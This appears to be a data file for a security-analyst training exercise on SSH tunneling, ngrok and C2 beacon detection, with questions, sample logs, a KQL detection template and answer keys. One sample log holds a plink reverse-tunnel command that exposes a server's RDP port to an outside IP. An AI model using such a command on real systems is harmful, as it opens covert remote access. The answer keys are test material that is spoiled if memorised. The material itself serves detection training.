        "As covered in Reading 1, -R specifically creates a listener on the remote/external side that tunnels back to a local service on the machine that initiated the connection — this is what lets an external attacker reach INTO an internal network via a tunnel that was only ever established through a permitted OUTBOUND connection, sidestepping inbound firewall rules entirely. -L, by contrast, only lets the initiating machine reach OUT to something through the remote side, which is a fundamentally different and less immediately dangerous access pattern for the attacker.",
      xp: 25,
    },

    // ── Question 2 ────────────────────────────────────────────────────────
    {
      type: "question" as const,
      id: "tunnel-q2",
      question:
        "A C2 beacon is configured with a 90-second interval and 30% jitter. Which of the following observed inter-arrival deltas would fall OUTSIDE the expected jittered band, and therefore not fit this specific beacon profile on its own?",
      options: [
        "72 seconds",
        "105 seconds",
        "40 seconds",
        "95 seconds",
      ],
      answer: 2,
      explanation:
        "With a 90-second interval and 30% jitter, the expected band is 90 minus 30% (63 seconds) through 90 plus 30% (117 seconds) — so 72, 95, and 105 seconds all fall within that 63-117 second range. A delta of 40 seconds falls well below the minimum of 63 seconds and would NOT fit this specific beacon's configured jitter band, meaning either this particular gap came from a different cause entirely, or the beacon's actual configuration differs from what's assumed.",
      xp: 30,
    },

    // ── Question 3 ────────────────────────────────────────────────────────
    {
      type: "question" as const,
      id: "tunnel-q3",
      question:
        "A production database server, which has never previously made outbound connections to any consumer SaaS platform, is observed making a TLS connection with SNI 'x7f2a9.ngrok-free.app'. Why is ngrok's own infrastructure being legitimate SaaS not enough to clear this finding on its own?",
      options: [
        "It should be cleared automatically, since ngrok is a well-known and reputable company",
        "Even though the underlying ngrok infrastructure and TLS traffic are genuinely legitimate from ngrok's own perspective, ngrok tunnels are also a well-documented technique for creating covert C2/exfiltration channels that blend into normal HTTPS-to-a-trusted-SaaS-provider traffic — the relevant question is whether THIS SPECIFIC HOST (a production database server with no ngrok usage history) has any legitimate business reason to be using a developer tunneling tool at all, not whether ngrok itself is a legitimate company",
        "ngrok domains are always automatically blocked by every corporate firewall, so this traffic must indicate a firewall bypass exploit",
        "SNI values ending in .app are a reserved TLD that cannot be used for legitimate purposes",
      ],
      answer: 1,
      explanation:
        "As Reading 5 emphasizes, the tool's own legitimacy doesn't resolve the investigation — what matters is whether THIS HOST has any business reason to use it. A production database server has no plausible legitimate need for a developer tunneling SaaS product; that context, not ngrok's reputation as a company, is what should drive the investigation. This is exactly the same reasoning pattern applied throughout this room to Chisel and plink.exe: dual-use, genuinely legitimate tools require contextual, not blanket, judgment.",
      xp: 25,
    },

    // ── Log Analysis 1: plink.exe reverse tunnel ─────────────────────────────
    {
      type: "log_analysis" as const,
      id: "tunnel-la1",
      heading: "Investigating an Unfamiliar SSH Client Launch on a Production Server",
      context:
        "SRV-APP12 is a production application server whose standard software inventory does not include any SSH client tooling. Review the Sysmon process-creation event below.",
      event: plinkReverseTunnelEvent,
      questions: [
        {
          question:
            "The command line reads 'plink.exe -ssh -N -R 3389:127.0.0.1:3389 -P 443 -l relay -pw ******** 45.83.219.11', and prior_occurrences_of_plink_on_host is 0. What does the -R flag combined with the -P 443 argument tell you about what this connection is actually doing?",
          options: [
            "It's a standard local file backup operation with no network tunneling involved",
            "This is a remote SSH port forward (-R), exposing SRV-APP12's own local port 3389 (RDP) to a listener on the remote host 45.83.219.11, and the connection is deliberately made on TCP port 443 (-P 443) rather than the standard SSH port 22, likely specifically to blend in with ordinary outbound HTTPS traffic on casual inspection",
            "-R indicates the connection is read-only and cannot transmit any data back to the remote host",
            "-P 443 means the connection is using plaintext HTTP rather than SSH at all",
          ],
          answer: 1,
          explanation:
            "As covered in Reading 1, -R specifically creates a remote listener that tunnels back to a local port — here, SRV-APP12's own RDP port (3389) is being exposed to whoever controls 45.83.219.11's listener. Running the SSH connection itself on port 443 instead of the standard port 22 is a deliberate choice consistent with disguising the traffic as ordinary HTTPS at a glance, exactly as discussed regarding attacker preference for outbound-blending techniques throughout this room.",
          xp: 25,
        },
        {
          question:
            "connection_duration_seconds_so_far shows 15240 (over 4 hours) and prior_occurrences_of_plink_on_host is 0. Why do these two facts together matter more than either alone?",
          options: [
            "Neither fact is relevant to determining whether this activity is suspicious",
            "A never-before-seen tool on this specific host, combined with a connection that has remained open continuously for over four hours (far longer than any single legitimate SSH command execution or file transfer would typically require), together indicate a persistent, maintained tunnel rather than a one-off administrative action — exactly the pattern expected of an active reverse tunnel being kept alive for ongoing attacker access",
            "A long connection duration always indicates a network hardware failure rather than any application-level activity",
            "prior_occurrences_of_plink_on_host being 0 means the event itself must be a logging error",
          ],
          answer: 1,
          explanation:
            "Individually, either fact alone could have an innocent explanation (a brand-new but legitimate admin tool; a long-lived connection for a genuinely long-running legitimate task). Together, a tool with zero prior history on this specific host maintaining an open connection for over four hours is far more consistent with a persistent access mechanism being kept alive deliberately than with a one-time, expected administrative action — this is exactly the kind of combined-signal reasoning this room has emphasized throughout.",
          xp: 25,
        },
        {
          question:
            "Given SignatureStatus is 'Valid' and Signed is 'true' for plink.exe (Company: Simon Tatham, the real, legitimate PuTTY suite author), should the valid code signature reduce how seriously this finding is treated?",
          options: [
            "Yes — a validly signed binary from a known publisher can never be involved in malicious activity, so this finding should be closed",
            "No — plink.exe being genuinely, legitimately signed by its real publisher is exactly why it's a favored living-off-the-land tool in the first place (Reading 5); a valid signature only confirms the BINARY's authenticity, not that its use in this specific context, on this specific host, launched from this specific unusual location and command line, is authorized or expected",
            "The signature status is irrelevant because Sysmon cannot actually verify code signatures",
            "A valid signature means this must be an approved IT deployment tool, ending the investigation",
          ],
          answer: 1,
          explanation:
            "This is precisely the point made in Reading 5: plink.exe's legitimate, valid signature is exactly why attackers favor it, and exactly why EDR/allowlisting often trusts it by default — the signature validates the binary's authenticity, not the legitimacy of any specific execution context. Combined with the unusual launch path (a Temp directory rather than a standard toolkit location), zero prior history, and the reverse-tunnel command-line arguments, this remains a high-priority finding despite the valid signature, not one resolved by it.",
          xp: 30,
        },
      ],
    },

    // ── Log Analysis 2: ngrok beacon investigation ───────────────────────────
    {
      type: "log_analysis" as const,
      id: "tunnel-la2",
      heading: "Investigating Repeated TLS Sessions From a Database Server to a Tunneling Domain",
      context:
        "SRV-DB07 hosts the company's production SQL Server instance and, per its documented network policy, should only ever communicate with the application tier and backup infrastructure. Review the event below.",
      event: ngrokBeaconEvent,
      questions: [
        {
          question:
            "network.domain (from tls.sni) shows '8f2a9c1e.ngrok-free.app', with connections_last_hour: 58 and interval_seconds_avg: 61.2 / interval_seconds_stddev: 6.8. What does this timing pattern indicate, using the beaconing math from Reading 4?",
          options: [
            "The interval and standard deviation values are irrelevant without knowing the exact jitter percentage configured",
            "58 connections averaging roughly 61 seconds apart, with a tight standard deviation of 6.8 seconds, is a textbook example of jittered beacon timing — the deltas cluster consistently in a bounded band around a roughly 60-second base interval, sustained over a full hour, which is not a pattern ordinary application or human-driven traffic produces",
            "This pattern proves the connections are entirely automated Windows Update checks unrelated to ngrok",
            "A standard deviation of 6.8 seconds indicates the connections are completely random with no underlying pattern at all",
          ],
          answer: 1,
          explanation:
            "A tight standard deviation (6.8 seconds) relative to a consistent ~61-second average, sustained across 58 connections over a full hour, is exactly the clustered-delta signature described in Reading 4's beaconing math — the exact jitter percentage doesn't need to be known in advance to recognize that the deltas are tightly bounded rather than randomly scattered, which is the core statistical tell regardless of the specific configured parameters.",
          xp: 25,
        },
        {
          question:
            "process_hint shows 'sqlservr.exe' — the actual SQL Server database engine process — as the source of these connections. Why does this specific detail sharply increase the severity of this finding?",
          options: [
            "It doesn't increase severity — any process on the host could equally explain this finding",
            "SQL Server's own database engine process has no legitimate reason to be initiating outbound HTTPS connections to a developer tunneling SaaS domain at all — this indicates the tunnel is being established from within, or by something exploiting, the database engine process itself, which is a far more severe finding than an unrelated administrative or monitoring process making the same connection would be",
            "sqlservr.exe is a placeholder value that always appears by default and carries no forensic significance",
            "This detail suggests the finding is a false positive, since SQL Server is expected to make outbound HTTPS connections routinely",
          ],
          answer: 1,
          explanation:
            "Attributing the beacon-shaped traffic specifically to sqlservr.exe — the core database engine, not some unrelated background utility — is a serious escalation: it suggests either the database engine has been compromised directly (potentially via a SQL injection vulnerability enabling command execution, or a malicious extended stored procedure), or an attacker has hijacked that process's identity/context to blend in. Either explanation is far more severe than if an unrelated monitoring agent had made the same connection, since it implies compromise of the production database engine itself.",
          xp: 30,
        },
        {
          question:
            "What is the correct, prioritized response given the combination of beacon-shaped timing, an ngrok tunneling domain, and sqlservr.exe as the source process?",
          options: [
            "Allowlist ngrok-free.app domains going forward to prevent similar alerts on other hosts",
            "Treat this as a high-severity, active compromise of the production database server: isolate SRV-DB07 from the network while preserving it for forensic investigation, investigate sqlservr.exe for signs of exploitation (recent extended stored procedure usage, unusual child processes, SQL injection indicators in query logs), block the ngrok destination, and treat any data the database contains as potentially exposed pending investigation",
            "No action needed since ngrok is a legitimate, reputable company and this must be an approved developer workflow",
            "Simply restart the SQL Server service and consider the issue resolved",
          ],
          answer: 1,
          explanation:
            "Given a production database engine process directly generating beacon-shaped traffic to a tunneling SaaS domain — with no documented business justification for a database server to use developer tunneling infrastructure at all — this warrants immediate, high-priority incident response: isolate the host while preserving forensic evidence, investigate the database engine itself for the specific exploitation mechanism, block the malicious tunnel destination, and treat the incident as a potential data exposure event given the sensitivity of what a production database typically contains. Allowlisting the domain or simply restarting the service would leave the underlying compromise unaddressed.",
          xp: 30,
        },
      ],
    },

    // ── Analyst Choice: approved pentest / verified dev use FP trap ──────────
    {
      type: "analyst_choice" as const,
      id: "tunnel-ac1",
      heading: "Verdict: An Engineer's Laptop Using ngrok During a Sprint Demo",
      scenario:
        "A detection rule flagged WKS-DEV27, a software engineer's laptop, for establishing TLS sessions with SNI matching *.ngrok-free.app during business hours. Calendar records show a sprint demo meeting scheduled at the exact time the connections began, and IT confirms this developer has a documented, standing exception permitting ngrok use for demoing locally-run features to stakeholders, on file with the security team for the past six months.",
      event: {
        id: "evt-tunnel-ac1-001",
        ts: "2026-07-02T14:30:00.000Z",
        source: "proxy",
        vendor: "Zscaler Internet Access",
        event_type: "net_connection",
        severity: "low",
        hostname: "WKS-DEV27.solvix.local",
        src_ip: "10.40.6.155",
        dst_ip: "18.223.101.4",
        dst_port: 443,
        protocol: "tcp",
        network: { domain: "c4a91f.ngrok-free.app" },
        it_verify_result: "confirmed",
        it_verify_message: "Standing exception on file since 2026-01: developer approved for ngrok use for stakeholder demos. Calendar shows a sprint demo at this exact time.",
        description:
          "WKS-DEV27 established a TLS session with SNI c4a91f.ngrok-free.app during a scheduled sprint demo meeting; connection duration matches the meeting's scheduled length",
        raw: {
          "tls.sni": "c4a91f.ngrok-free.app",
          "destination.ip": "18.223.101.4",
          "destination.port": 443,
          "network.protocol": "https",
          connections_last_hour: 1,
          session_duration_seconds: 2640,
          process_hint: "ngrok.exe",
        },
      },
      correct_verdict: "false_positive",
      explanation:
        "Every raw signal here — an ngrok SNI, a developer workstation, ngrok.exe as the process — is technically identical to the malicious pattern in Log Analysis 2, which is exactly the point: it_verify_result confirms a standing, documented, six-month-old exception specifically authorizing this exact behavior for this exact user, the timing precisely matches a scheduled calendar event (a sprint demo, the documented legitimate use case), the connection count is a single session (not dozens of repeating beacon-shaped connections), and the duration (44 minutes) matches a plausible meeting length rather than an indefinitely-sustained tunnel. This is exactly the dual-use, legitimate case Reading 5 described.",
      fp_trap:
        "After Log Analysis 2's finding that an ngrok connection from a database server was a serious active compromise, it's tempting to treat ANY ngrok traffic as inherently high-severity from now on. But the room was explicit throughout: the tool's presence alone is never sufficient, context is everything. Here, unlike the database server case, there IS a documented business justification, an authorized user with a standing exception, a single (not repeating/beacon-shaped) session, and calendar corroboration — none of which existed in the malicious example. Escalating this identically to the database server finding, purely because both involve the string 'ngrok', would ignore every contextual differentiator this room has spent six readings teaching you to weigh.",
      xp: 30,
    },

    // ── Matching: tunneling technique <-> mechanism ─────────────────────────
    {
      type: "matching" as const,
      id: "tunnel-m1",
      heading: "Match Each Tunneling Technique or Tool to Its Core Mechanism",
      instructions: "Match each technique/tool to how it actually works at the protocol/mechanism level.",
      pairs: [
        { id: "sshL", left: "SSH -L (local forward)", right: "Opens a listener on the initiating machine that tunnels OUT to a service reachable from the remote side" },
        { id: "sshR", left: "SSH -R (remote forward)", right: "Opens a listener on the REMOTE side that tunnels back IN to a service on the initiating machine — the dangerous, firewall-bypassing direction" },
        { id: "sshD", left: "SSH -D (dynamic forward)", right: "Turns the local machine into a full SOCKS proxy, allowing any application to reach any destination reachable from the remote side" },
        { id: "icmp", left: "ICMP tunneling", right: "Encodes arbitrary command/data payload inside ICMP echo request/reply packets, abusing the unused padding field ping normally sends" },
        { id: "ngrokmech", left: "ngrok", right: "Creates a public tunnel to a local service entirely through ngrok's own cloud infrastructure, requiring no inbound firewall changes or public IP on the target end" },
        { id: "chisel", left: "Chisel", right: "A single-file, dependency-free binary that tunnels TCP/UDP over HTTP, frequently paired with SOCKS proxy functionality for pivoting" },
      ],
      explanation:
        "Each technique moves data through a different mechanism, but they share a common theme: all of them ride on protocols or infrastructure that is either encrypted, widely trusted, or both, specifically to blend in with legitimate traffic. Recognizing the exact mechanism — which direction a listener opens, what protocol carries the payload, what infrastructure is involved — is what lets an analyst predict exactly which log source and which specific field will contain the evidence.",
      xp: 40,
    },

    // ── Ordering: beacon detection workflow ──────────────────────────────────
    {
      type: "ordering" as const,
      id: "tunnel-o1",
      heading: "Order the Beacon Detection Workflow",
      instructions: "Arrange these steps into the correct order for statistically confirming a suspected C2 beacon.",
      items: [
        { id: "collect", text: "Collect all connection timestamps from the host to the specific destination in question" },
        { id: "deltas", text: "Compute the inter-arrival deltas (time gaps) between each successive connection" },
        { id: "band", text: "Check whether the deltas cluster tightly within a bounded band around a consistent average" },
        { id: "bytes", text: "Check whether the byte count per connection is also consistent session after session" },
        { id: "rarity", text: "Check the destination's rarity and reputation across the wider network" },
        { id: "ancestry", text: "Correlate with process ancestry/command line if endpoint telemetry is available" },
        { id: "verdict", text: "Weigh all signals together and reach a verdict, checking for a documented legitimate explanation before escalating" },
      ],
      correct_order: ["collect", "deltas", "band", "bytes", "rarity", "ancestry", "verdict"],
      explanation:
        "This mirrors the exact investigative sequence from Reading 4 and Reading 6: first gather the raw timing data, compute the deltas between connections, check whether those deltas cluster in a bounded band (the core beacon-timing signal), reinforce with byte-count consistency, weigh destination rarity, pull in any available process-level context, and only then reach a verdict — critically, after checking for a documented, legitimate business explanation, exactly as emphasized throughout this room's false-positive examples.",
      xp: 35,
    },

    // ── Query Fill: KQL to surface beacon-shaped connections by interval ────
    {
      type: "query_fill" as const,
      id: "tunnel-qf1",
      heading: "Write It Yourself: Surface Beacon-Shaped Connections in KQL",
      language: "kql",
      context:
        "Using the pattern confirmed in Log Analysis 2 (many connections, tightly clustered interval, consistent byte sizes), write the KQL a detection engineer would deploy to catch this pattern across the environment.",
      template:
        "DeviceNetworkEvents\n| where RemotePort == {{port}}\n| summarize ConnectionCount = count(), AvgInterval = avg(datetime_diff('second', Timestamp, prev(Timestamp))) by DeviceName, RemoteUrl\n| where ConnectionCount > {{threshold}}\n| where AvgInterval between ({{low}} .. {{high}})",
      blanks: [
        { id: "port", answers: ["443"], placeholder: "standard HTTPS port" },
        { id: "threshold", answers: ["20", "30", "40"], placeholder: "minimum connection count to consider a repeating pattern" },
        { id: "low", answers: ["48", "50"], placeholder: "lower bound of the expected jittered interval band" },
        { id: "high", answers: ["72", "75"], placeholder: "upper bound of the expected jittered interval band" },
      ],
      explanation:
        "This mirrors the exact statistical case from Log Analysis 2: filter to HTTPS connections, group by device and remote destination, compute the average interval between successive connections, require a minimum connection count to have enough samples for statistical confidence, and check that the average interval falls within the expected jittered band around a candidate base interval — exactly the 48-72 second band that would catch a ~60-second interval with roughly 20% jitter, mirroring the exact math walked through in Reading 4.",
      xp: 35,
    },

    // ── Flag ──────────────────────────────────────────────────────────────
    {
      type: "flag" as const,
      id: "tunnel-f1",
      prompt:
        "Look at Log Analysis 1, the plink.exe investigation on SRV-APP12. What is the exact destination IP address the reverse tunnel connected to? Enter it exactly as shown in the command line or dst_ip field.",
      answer: "45.83.219.11",
      hint: "Look at the dst_ip field or the trailing IP address in the plink.exe command line in the raw log.",
      xp: 25,
    },
  ],
};

export default [tunnelingRoom];
